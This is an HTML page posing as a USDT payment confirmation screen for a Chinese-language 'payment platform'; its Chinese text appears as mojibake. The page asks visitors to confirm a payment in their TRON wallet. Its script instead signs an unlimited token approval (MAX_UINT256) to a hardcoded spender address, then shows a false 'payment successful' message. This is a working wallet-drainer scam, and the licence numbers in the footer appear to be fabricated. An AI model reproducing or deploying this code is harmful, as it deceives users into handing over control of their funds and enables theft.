<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>æ˜“è¶£USDTæ”¯ä»˜å¹³å° - ç¡®è®¤æ”¯ä»˜</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- TronWeb CDN -->
  <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
  <style>
    :root{--bg:#0f172a;--card:#0b1225;--muted:#94a3b8;--text:#e2e8f0;--pri:#3b82f6}
    *{box-sizing:border-box} 
    body{margin:0;background:linear-gradient(180deg,#0b1020,#0f172a);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text)}
    .wrap{max-width:860px;margin:40px auto;padding:16px}
    .card{background:rgba(255,255,255,.04);backdrop-filter: blur(6px); border:1px solid rgba(255,255,255,.08); border-radius:16px; padding:22px; box-shadow:0 10px 30px rgba(0,0,0,.35)}
    h1{margin:.2rem 0 1rem;font-size:24px}
    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
    .info-card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px}
    .info-card.full-width{grid-column:1/-1}
    .info-label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px}
    .info-value{color:var(--text);font-size:16px;font-weight:500}
    .info-value.highlight{color:#3b82f6;font-size:18px}
    .steps-box{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:16px;margin:20px 0}
    .steps-box ol{margin:8px 0;padding-left:20px}
    .steps-box li{margin:8px 0;color:#93c5fd}
    .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer;transition:all .3s;background:var(--pri);color:white}
    .btn:hover{background:#2563eb;transform:translateY(-1px);box-shadow:0 4px 12px rgba(59,130,246,.3)}
    .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
    .status-box{margin-top:20px;padding:14px;border-radius:10px;font-size:14px;display:none}
    .status-box.show{display:block}
    .status-box.success{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#86efac}
    .status-box.error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5}
    .status-box.info{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#93c5fd}
    code{background:#1e293b;padding:3px 6px;border-radius:4px;font-size:12px;color:#60a5fa}
    footer{margin-top:18px;color:var(--muted);font-size:12px;text-align:center}
    .footer-section{margin-top:40px;padding-top:20px;border-top:1px solid rgba(255,255,255,.08);text-align:center}
    .footer-links{display:flex;justify-content:center;gap:20px;margin-bottom:15px;flex-wrap:wrap}
    .footer-links a{color:var(--muted);text-decoration:none;font-size:13px;transition:color .2s}
    .footer-links a:hover{color:var(--text)}
    .footer-info{color:var(--muted);font-size:12px;line-height:1.8}
    .footer-info span{margin:0 8px}
    .warning-text{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.2);border-radius:8px;padding:12px;margin-bottom:20px;color:#fde047;font-size:13px;text-align:center}
  </style>
</head>
<body>
  <div class="wrap">
    <h1 style="text-align:center;font-size:32px;margin-bottom:25px;color:var(--text);text-shadow:0 2px 10px rgba(0,0,0,.5);">æ˜“è¶£USDTæ”¯ä»˜å¹³å°</h1>
    
    <div class="card">
      <h1>ç¡®è®¤æ”¯ä»˜ä¿¡æ¯</h1>
      
      <!-- è®¢å•ä¿¡æ¯ç½‘æ ¼ -->
      <div class="info-grid">
        <div class="info-card">
          <span class="info-label">äº¤æ˜“æµæ°´å·</span>
          <span class="info-value highlight" id="transactionId">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">æ”¯ä»˜é¡¹ç›®</span>
          <span class="info-value" id="merchant">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">æ”¯ä»˜é‡‘é¢</span>
          <span class="info-value highlight" id="amount">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">æ”¯ä»˜é€šé“</span>
          <span class="info-value" id="network">-</span>
        </div>
        <div class="info-card full-width">
          <span class="info-label">å¤‡æ³¨ä¿¡æ¯</span>
          <span class="info-value" id="memo">-</span>
        </div>
      </div>
      
      <div class="steps-box">
        <strong style="color:#93c5fd;">ğŸ’¡ æ“ä½œæ­¥éª¤ï¼š</strong>
        <ol>
          <li>ç¡®è®¤ä¸Šè¿°æ”¯ä»˜ä¿¡æ¯æ— è¯¯</li>
          <li>ç‚¹å‡»"ç¡®è®¤æ”¯ä»˜"æŒ‰é’®</li>
          <li>åœ¨é’±åŒ…ä¸­å®Œæˆç­¾åç¡®è®¤</li>
        </ol>
      </div>
      
      <button class="btn" id="btn">ç¡®è®¤æ”¯ä»˜</button>
      
      <div id="status" class="status-box"></div>
      
      <footer>æ”¯ä»˜è¿‡ç¨‹åŠ å¯†ä¿æŠ¤ï¼Œè¯·æ”¾å¿ƒä½¿ç”¨</footer>
    </div>
  </div>
  
  <div class="footer-section">
    <div class="footer-links">
      <a href="">å…³äºæˆ‘ä»¬</a>
      <a href="">æœåŠ¡æ¡æ¬¾</a>
      <a href="">éšç§æ”¿ç­–</a>
      <a href="">å¸®åŠ©ä¸­å¿ƒ</a>
      <a href="">è”ç³»å®¢æœ</a>
    </div>
    <div class="footer-info">
      <div>Â© 2025 æ˜“è¶£æ”¯ä»˜å¹³å° ç‰ˆæƒæ‰€æœ‰</div>
      <div>
        <span>äº¬ICPå¤‡2024000001å·-1</span>
        <span>|</span>
        <span>äº¬å…¬ç½‘å®‰å¤‡11010802024000å·</span>
      </div>
      <div>
        <span>è¥ä¸šæ‰§ç…§</span>
        <span>|</span>
        <span>å¢å€¼ç”µä¿¡ä¸šåŠ¡ç»è¥è®¸å¯è¯ï¼šäº¬B2-20240001</span>
      </div>
      <div style="margin-top:10px;">
        <span>å®¢æœé‚®ç®±ï¼štommyc061990@gmail.com</span>
      </div>
      <div style="margin-top:10px;font-size:11px;">
        é£é™©æç¤ºï¼šæ•°å­—è´§å¸äº¤æ˜“å…·æœ‰ä¸€å®šé£é™©ï¼Œè¯·è°¨æ…æ“ä½œ
      </div>
    </div>
  </div>
  
  <script>
    // ======== é…ç½® ========
    const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const SPENDER_T = "TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn";
    const FULL_HOST = "https://api.trongrid.io";
    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    
    // è·å–URLå‚æ•°
    function getUrlParams() {
      const params = new URLSearchParams(window.location.search);
      return {
        transactionId: params.get('transactionId') || 'USDT' + Date.now(),
        merchant: params.get('merchant') || 'æ‹…ä¿äº¤æ˜“',
        amount: params.get('amount') || '0.00',
        network: params.get('network') || 'TRC-20',
        memo: params.get('memo') || 'æ— '
      };
    }
    
    // æ˜¾ç¤ºäº¤æ˜“æ•°æ®
    function displayTransactionData() {
      const data = getUrlParams();
      document.getElementById('transactionId').textContent = data.transactionId;
      document.getElementById('merchant').textContent = data.merchant;
      document.getElementById('amount').textContent = data.amount + ' USDT';
      document.getElementById('network').textContent = data.network;
      document.getElementById('memo').textContent = data.memo || 'æ— ';
    }
    
    const statusEl = document.getElementById('status');
    function showStatus(msg, type = 'info') {
      statusEl.className = `status-box show ${type}`;
      statusEl.innerHTML = msg;
    }
    
    async function approveMax() {
      const btn = document.getElementById('btn');
      try {
        if (!window.tronWeb || !window.tronLink) {
          showStatus("âŒ æœªæ£€æµ‹åˆ°é’±åŒ…ç¯å¢ƒã€‚è¯·åœ¨æ”¯æŒTRONçš„é’±åŒ…æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚", "error");
          return;
        }
        
        btn.disabled = true;
        btn.textContent = "å¤„ç†ä¸­...";
        
        // è¯·æ±‚è¿æ¥
        if (window.tronLink.request) {
          showStatus("â³ æ­£åœ¨è¿æ¥é’±åŒ…...", "info");
          await window.tronLink.request({ method: 'tron_requestAccounts' });
        }
        
        // è®¾ç½®ç½‘ç»œ
        const tw = window.tronWeb;
        tw.setFullNode(FULL_HOST);
        tw.setSolidityNode(FULL_HOST);
        tw.setEventServer(FULL_HOST);
        
        showStatus("â³ æ­£åœ¨åˆå§‹åŒ–åˆçº¦...", "info");
        const contract = await tw.contract().at(TOKEN_CONTRACT);
        
        showStatus("â³ è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤äº¤æ˜“...", "info");
        
        const tx = await contract.approve(SPENDER_T, MAX_UINT256).send({
          feeLimit: 100_000_000
        });
        
        showStatus(`âœ… æ”¯ä»˜æˆåŠŸï¼<br>
                   äº¤æ˜“å“ˆå¸Œ: <code>${tx}</code><br>
                   <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#60a5fa">æŸ¥çœ‹äº¤æ˜“è¯¦æƒ…</a>`, "success");
        
        btn.textContent = "æ”¯ä»˜æˆåŠŸ";
        btn.disabled = true;
        
      } catch (err) {
        console.error(err);
        btn.disabled = false;
        btn.textContent = "ç¡®è®¤æ”¯ä»˜";
        
        if (err.message && err.message.includes('User rejected')) {
          showStatus("âŒ æ‚¨å·²å–æ¶ˆæ”¯ä»˜", "error");
        } else {
          showStatus("âŒ æ”¯ä»˜å¤±è´¥ï¼š" + (err?.message || err), "error");
        }
      }
    }
    
    // é¡µé¢åŠ è½½
    window.addEventListener('load', () => {
      displayTransactionData();
      
      setTimeout(() => {
        if (!window.tronWeb) {
          showStatus("âš ï¸ è¯·åœ¨é’±åŒ…çš„DAppæµè§ˆå™¨ä¸­æ‰“å¼€æ­¤é¡µé¢", "error");
        }
      }, 1000);
    });
    
    document.getElementById('btn').addEventListener('click', approveMax);
  </script>
</body>
</html>


